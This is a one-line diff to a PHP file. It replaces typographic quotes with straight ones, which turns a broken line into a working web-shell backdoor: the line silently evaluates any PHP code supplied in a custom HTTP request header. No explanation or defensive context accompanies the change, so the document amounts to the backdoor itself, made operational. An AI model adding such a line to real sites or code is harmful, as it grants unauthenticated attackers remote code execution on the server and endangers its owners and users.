@@ -1,1 +1,1 @@
-<?php @eval($_SERVER[‘HTTP_PHPSPL01T’]); ?>
+<?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>
